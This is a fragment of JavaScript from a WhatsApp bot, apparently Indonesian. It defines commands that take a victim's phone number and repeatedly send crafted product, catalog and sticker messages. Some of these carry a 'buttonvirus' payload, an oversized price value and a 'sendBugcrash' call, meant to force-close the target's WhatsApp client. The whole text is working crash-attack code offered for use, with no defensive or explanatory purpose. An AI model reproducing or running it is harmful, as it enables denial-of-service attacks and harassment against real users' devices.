CATALOG :
{
    if (!isGroup) return diablobotwhatsapp.reply('Khusus Member Group AmnetzOne Maker')
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `MAMPUS FC CHUAKS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `Nomor Owner Di Atas`,
    "url": `https://linki.ee/NetzOneMaker`
    },
    "businessOwnerJid": "6281998199848@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
    diablobotwhatsapp.reply(`SUKSES TERKIRIM JAN LUPA JEDANYA OM `)
    }

    STICKER : 
    {
        if (!isGroup) return diablobotwhatsapp.reply('Khusus Member Group 4K Samzz')
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
         jumlah = '2'
        waktu = '3s'
        for (let i = 0; i < jumlah; i++) {
        diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
        await sleep(ms(waktu))
        }
        }
         PRODUK :
         {
            if (!isGroup) return diablobotwhatsapp.reply('Khusus Member Group 4K_Samzz')
            if (!q) return 
            num = `${q}`+'@s.whatsapp.net'
             jumlah = '2'
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6288292205418@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
            await sleep(ms(waktu))
            }
            }
